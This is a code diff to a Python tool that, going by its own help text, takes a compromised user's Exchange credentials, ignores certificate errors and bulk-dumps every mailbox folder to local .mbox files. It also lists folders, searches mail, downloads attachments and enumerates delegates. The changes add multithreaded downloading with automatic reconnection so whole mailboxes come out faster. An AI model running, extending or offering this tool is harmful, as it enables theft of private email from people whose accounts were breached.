@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 import re
 from exchangelib import Account, Credentials, Configuration, DELEGATE, Folder, FileAttachment, BaseProtocol, \
-    NoVerifyHTTPAdapter, Message, Q
+    NoVerifyHTTPAdapter, Message, Q, FaultTolerance
 from exchangelib.errors import UnauthorizedError, CASError
 import mailbox
 import requests
@@ -11,8 +11,14 @@ import sys
 import logging
 import os
 from os.path import isfile
-import urllib3
+import math
 import tqdm
+import time
+import getpass
+import threading
+import urllib3
+
+messages_per_thread = None
 
 # ignore certificate errors and suspend warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -45,7 +51,8 @@ def acctSetup(params):
 
     try:
         config = Configuration(
-            server=server, credentials=Credentials(email, password))
+            server=server, credentials=Credentials(email, password), retry_policy=FaultTolerance(max_wait=3),
+            max_connections=2)
 
         if params.get('delegated'):
             account = Account(primary_smtp_address=shared,
@@ -56,7 +63,7 @@ def acctSetup(params):
 
         return account
     except Exception as e:
-        print(e)
+        print(f'[!] Error while connecting:\n{e}')
 
 
 # List folders from a users inbox
@@ -125,7 +132,7 @@ def searchEmail(accountObject, params, loghandle):
 
     if params.get('field') == 'body':
         print(
-                '[+] Searching Email body for {} in {} Folder [+]'.format(terms, folder) + '\n')
+            '[+] Searching Email body for {} in {} Folder [+]'.format(terms, folder) + '\n')
         for term in termList:
             filtered_emails.append(searchFolder.all().filter(body__contains=term)[:count])
     else:
@@ -254,24 +261,29 @@ def print_logo():
 
 
 def findFolder(accountObject=None, folder_to_find=None):
-    for folder in accountObject.msg_folder_root.walk():
-        if folder.name.lower() == folder_to_find.lower():
-            return folder
-    else:
-        return None
+    found = list(accountObject.msg_folder_root.glob(folder_to_find))[0]
+    return found
+    # for folder in accountObject.msg_folder_root.walk():
+    #     if folder.name.lower() == folder_to_find.lower():
+    #         return folder
+    # else:
+    #     return None
 
 
 def sanitaze_file_path(file_path=None):
-    return re.sub("[^а-яА-ЯёЁ0-9a-zA-Z\s-]+", " ", file_path)
+    return re.sub(r"[^\sа-яА-ЯёЁ0-9a-zA-Z\]\[]+", " ", file_path)
 
 
-def dump_to_Mbox(folder_name=None, mbox_file_path=None, messages=[]):
+def dump_to_Mbox(folder_name=None, mbox_file_path=None, messages_from_threads=[]):
     try:
+        # look at this magic (list of lists into flat list)
+        messages_from_threads = [item for sublist in messages_from_threads for item in sublist]
+
         mbox = mailbox.mbox(mbox_file_path)
         mbox.lock()
-        desc = "[+] Saving folder {} to {}".format('"' + folder_name + '"', mbox_file_path)
-        for message_index in tqdm.tqdm(range(len(messages)), desc=desc, leave=False, unit="email"):
-            msg = mailbox.mboxMessage(messages[message_index])
+        desc = f"[+] Saving folder \"{folder_name}\""
+        for message_index in tqdm.tqdm(range(len(messages_from_threads)), desc=desc, leave=False, unit="email"):
+            msg = mailbox.mboxMessage(messages_from_threads[message_index])
             mbox.add(msg)
             mbox.flush()
         mbox.unlock()
@@ -281,38 +293,59 @@ def dump_to_Mbox(folder_name=None, mbox_file_path=None, messages=[]):
     finally:
         size = os.path.getsize(mbox_file_path)
         size = size / (1024 * 1024)
-        print("[+] Folder {:30s} dumped to {} ({} emails {:.3f} MB)".format('"' + folder_name + '"', mbox_file_path,
-                                                                        str(len(messages)) , size))
+        info = "({} emails {:.3f} MB)".format(str(len(messages_from_threads)), size)
+        print("[+] Folder {:25s} dumped to {} {:>18}".format('"' + folder_name + '"', mbox_file_path, info))
 
 
-def get_emails(accountObject=None, items_list=None, folder_name=None):
+def get_emails(accountObject=None, items_list=None, folder_name=None, thread_index=None, params=None):
+    global messages_per_thread
     messages = []
-    items_list = list(items_list)
     # you can try with this parameter for perfomance:
-    # bur in my case by one is fastest
+    # but in my case by one is fastest
     count_per_task = 1
+
     if folder_name:
-        desc = f"[+] Downloading folder \"{folder_name}\""
+        desc = f"[+] Downloading \"{folder_name}\""
+        if params.get('threads') != 1:
+            desc += f' (Thr №{thread_index})'
     else:
         desc = ""
+
     for i in tqdm.tqdm(range(0, len(items_list), count_per_task), desc=desc, leave=False, unit="email"):
-        temp = items_list[i:i + count_per_task]
-        for mime in accountObject.fetch(temp):
-            messages.append(mime.mime_content)
-    # if folder_name:
-    #     print(f"[+] Downloaded {folder_name}")
-    return messages
+        # takes list of N ids of emails and downloading its mime (plain .eml file)
+        # while True:
+        while True:
+            try:
+
+                temp = items_list[i:i + count_per_task]
+                for mime in accountObject.fetch(temp, only_fields=['mime_content']):
+                    messages.append(mime.mime_content)
+                break
+
+            except Exception as e:
+                # accountObject = acctSetup(params)
+                # print(e)
+                print(f"[!] Thread {thread_index} is reconnected!")
+                continue
+
+    messages_per_thread[thread_index] = messages
+    accountObject.protocol.close()
+
+    return 0
 
 
-def dumper(accountObject=None, folder_to_dump="Inbox", local_folder="dump", emails_count=None):
+def dumper(accountObject=None, params=None):
     # брать папку из аргументов если dump all -d "папка куда"
 
     base_folder = None
+    folder_to_dump = params.get('folder')
+    local_folder = params.get('dump_folder')
+    emails_count = params.get('count')
 
     if folder_to_dump.lower() == "inbox":
-        base_folder = accountObject.Inbox
+        base_folder = accountObject.inbox
     elif folder_to_dump.lower() == "sent":
-        base_folder = accountObject.Sent
+        base_folder = accountObject.sent
     elif folder_to_dump.lower() == "all":
         base_folder = accountObject.msg_folder_root
     else:
@@ -327,40 +360,81 @@ def dumper(accountObject=None, folder_to_dump="Inbox", local_folder="dump", emai
     else:
         try:
             os.mkdir(local_folder)
-            print(f"\n[+] Folder {local_folder} created")
+            print(f"\n[+] Folder \"{local_folder}\" created")
         except Exception as e:
             print(f"\n[-] Something went wrong while creating {local_folder}:")
             print(e)
             return 1
 
-    # If messages in folder are present:
-    if base_folder.total_count != 0:
-        folder_name = sanitaze_file_path(base_folder.name)
-        mbox_file_path = f"./{local_folder}/{folder_name}.mbox"
+    all_folders_2_dump = [base_folder]
+    all_folders_2_dump += [folder for folder in base_folder.walk()]
+    # to-do : filter folders without emails like calendar
 
-        items = base_folder.all().only('id', 'changekey').order_by('-datetime_received')
-        if emails_count:
-            items = items[:emails_count]
-        messages = get_emails(accountObject=accountObject, items_list=items, folder_name=base_folder.name)
-        dump_to_Mbox(folder_name=base_folder.name, mbox_file_path=mbox_file_path, messages=messages)
-
-    # Walking across subfolders:
-    for folder in base_folder.walk():
-        # If folder have no messages, go to next folder
+    for folder in all_folders_2_dump:
+        # If messages in folder are present:
         if folder.total_count == 0:
             continue
 
+        global messages_per_thread
+
+        thread_count = params.get('threads')
+
         mbox_file_path = (folder.absolute).replace(base_folder.absolute + "/", "")
+        mbox_file_path = "[" + folder.parent.name + "] " if folder.parent.name not in [base_folder.name,
+                                                                                       accountObject.msg_folder_root.name] else ""
+        mbox_file_path += folder.name
         mbox_file_path = sanitaze_file_path(mbox_file_path)
         mbox_file_path = f"./{local_folder}/{mbox_file_path}.mbox"
 
-        items = folder.all().only('id', 'changekey').order_by('-datetime_received')  # [:10]
-        if emails_count:
-            items = items[:emails_count]
-        messages = get_emails(accountObject=accountObject, items_list=items, folder_name=folder.name)
-        dump_to_Mbox(folder_name=folder.name, mbox_file_path=mbox_file_path, messages=messages)
+        threads_lists = []
 
-    print("\n[=] All folders downloaded\n\n")
+        messages_per_thread = [[]] * thread_count
+
+        # just IDs of emails in folder:
+
+        if not emails_count:
+            emails_count = base_folder.total_count
+
+        all_items = list(
+            folder.all().order_by('-datetime_received').values_list('id', 'changekey')[:emails_count])
+
+        if len(all_items) == 0:
+            continue
+
+        messages_count_per_thread = int(math.ceil(len(all_items) / thread_count))
+
+        items_per_thread = []
+
+        # its really better
+        if len(all_items) <= 10:
+            thread_count = 1
+
+        # emails_count - 1 is eq to len(all_items)
+        for i in range(0, emails_count - 1, messages_count_per_thread):
+            items_per_thread.append(all_items[i:i + messages_count_per_thread])
+
+        accountObjects = [None] * thread_count
+
+        for index in range(thread_count):
+            # one connection per thread
+            if len(items_per_thread[index]) == 0:
+                continue
+            accountObjects[index] = acctSetup(parsed_arguments)
+            t = threading.Thread(target=get_emails,
+                                 kwargs={'accountObject': accountObjects[index],
+                                         'items_list': items_per_thread[index],
+                                         'folder_name': folder.name, 'thread_index': index, 'params': params})
+            threads_lists.append(t)
+            t.start()
+
+        for t in threads_lists:
+            t.join()
+
+        # messages = get_emails(accountObject=accountObject, items_list=items, folder_name=base_folder.name)
+        dump_to_Mbox(folder_name=folder.name, mbox_file_path=mbox_file_path,
+                     messages_from_threads=messages_per_thread)
+
+    print("\n[=] All folders downloaded")
 
 
 if __name__ == "__main__":
@@ -382,7 +456,7 @@ if __name__ == "__main__":
     optional_parser.add_argument('-e', '--email', action="store",
                                  dest="email", help='Email address of compromised user')
     optional_parser.add_argument('-p', '--password', action="store",
-                                 dest="password", help='Password of compromised user')
+                                 dest="password", help='Password, leave empty for prompt')
 
     folder_parser = subparsers.add_parser(
         'folders', help="List Mailbox Folders", parents=[optional_parser])
@@ -401,6 +475,8 @@ if __name__ == "__main__":
                              help='Local folder to store .mbox dumps')
     dump_parser.add_argument('-c', '--count', action='store', default=None, type=int,
                              help='Count of N last emails in folder to dump')
+    dump_parser.add_argument('-t', '--threads', action='store', default="1", type=int,
+                             help='Threads count')
 
     attach_parser = subparsers.add_parser(
         'attachment', help="List/Download Attachments", parents=[optional_parser])
@@ -444,29 +520,38 @@ if __name__ == "__main__":
         parser.print_help()
         sys.exit()
 
+    print(f"[+] Email - {args.email}, server - {args.server}")
+
+    if not args.password:
+        args.password = getpass.getpass(prompt='Password: ', stream=None)
+
     parsed_arguments = vars(args)  # Convert Args to a Dictionary
     if parsed_arguments.get("galList"):
         fileparser = file_parser(parsed_arguments)
 
-    if parsed_arguments.get("output"):
-        loghandle = loggerCreate(parsed_arguments)
+    # if parsed_arguments.get("output"):
+    #     loghandle = loggerCreate(parsed_arguments)
     accountObj = acctSetup(parsed_arguments)
 
     if accountObj is None:
-        print('[+] Could not connect to MailBox [+]')
+        print('[=] Could not connect to MailBox\n\n')
         sys.exit()
 
-    print(f"[+] Email - {args.email}, server - {args.server}")
+    start_time = time.time()
 
     if parsed_arguments['modules'] == 'folders':
         print_folders(accountObj, tree_view=not args.absolute, count=args.count, root=args.root)
     elif parsed_arguments['modules'] == 'dump':
-        dumper(accountObj, folder_to_dump=args.folder, local_folder=args.dump_folder, emails_count=args.count)
+        dumper(accountObj, params=parsed_arguments)
+        # folder_to_dump=args.folder, local_folder=args.dump_folder, emails_count=args.count,
+        # thread_count=args.threads)
     elif parsed_arguments['modules'] == 'emails':
         searchEmail(accountObj, parsed_arguments, loghandle)
     elif parsed_arguments['modules'] == 'attachment':
         searchAttachments(accountObj, parsed_arguments)
     elif parsed_arguments['modules'] == 'delegation':
         searchDelegates(parsed_arguments, fileparser)
+
+    print("[=] Took time: {:.3f} min\n\n".format((time.time() - start_time) / 60))
 
 # to-do get file sizes
